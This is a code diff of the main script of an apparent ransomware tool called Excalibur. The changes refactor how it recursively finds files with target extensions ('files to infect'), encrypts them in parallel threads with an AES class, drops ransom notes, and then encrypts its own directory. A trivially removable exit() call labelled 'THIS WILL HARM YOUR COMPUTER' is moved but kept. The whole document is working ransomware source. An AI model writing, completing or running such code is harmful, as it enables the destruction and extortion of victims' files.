@@ -1,12 +1,13 @@
-import sys
 import os
+import sys
 
 from base64 import encodebytes
 from getpass import getpass
 from time import time
+# from platform import platform  # Replace sys.platform
 
-from src.functions import recursive_walk, create_chunks, leave_notes
-from src.classes import AsyncEncrypt, AesExcalibur, Colors
+from src.functions import recursive_walk, parse_array, create_chunks, leave_notes
+from src.classes import ThreadedEncrypt, AesExcalibur, Colors
 from src.variables import ascii_art, target_extensions, note
 
 
@@ -21,13 +22,11 @@ elif sys.platform in ["win32", "win64", "Windows", "windows"]:
 def main():
     """
     Recursively encrypt or decrypt the filesystem
-    Display beautiful artwork
     Ward away the skids with exit()
     """
-
     os.system("clear" if sys.platform == "linux" else "cls")
-    exit("THIS WILL HARM YOUR COMPUTER")
     print(Colors.blue + ascii_art)
+    exit("THIS WILL HARM YOUR COMPUTER")
 
     # Get and encode encryption password
     password = getpass(Colors.bold + "Enter a password for the encryption key: ")
@@ -42,28 +41,30 @@ def main():
         # Get array of files to infect
         file_array = recursive_walk(paths, target_extensions, 1)
 
-        # Split the array depending on how large it is. If more than 100,000 elements exist, use max 10 threads
-        if len(file_array) > 100000:
-            chunks = 12
-        else:
-            chunks = 6
+        # Split the array depending on how large it is. If more than 100,000 elements exist, use 10 threads
+        chunk_size = parse_array(file_array)
 
         threads = []
-        for chunk in list(create_chunks(file_array, chunks)):  # Loop through each chunk in array
-            t = AsyncEncrypt(sanctuary, chunk)  # Start a new thread for each chunk
+        for chunk in list(create_chunks(file_array, chunk_size)):  # Loop through each chunk in array
+            t = ThreadedEncrypt(sanctuary, chunk)  # Create a new thread for each chunk
             t.start()
             threads.append(t)
 
         # Wait until all threads have joined, then drop notes and encrypt self
-        while threads:
-            # [threads.remove(t) for t in threads if not t.is_alive()]
-            for t in threads:
-                if not t.is_alive():
-                    threads.remove(t)
+        for t in threads:
+            t.join()
 
         leave_notes(note, paths)
-        sanctuary.encrypt_file(os.path.abspath(sys.argv[0]))
 
+        # Encrypt everything in Excalibur directory
+        for rootdir, subdir, files in os.walk("."):
+            for file in files:
+                sanctuary.encrypt_file(os.path.abspath(file))
+
+        # sanctuary.encrypt_file(os.path.abspath(__file__)) # Encrypt main.py
+        # sanctuary.encrypt_file(os.path.abspath(sys.argv[0]))
+
+    # Decryption is not threaded purely for debugging purposes
     elif user_input in ["d", "D", "dec", "decrypt", "Decrypt"]:
         file_array = recursive_walk(paths, target_extensions, 2)
         for file in file_array:
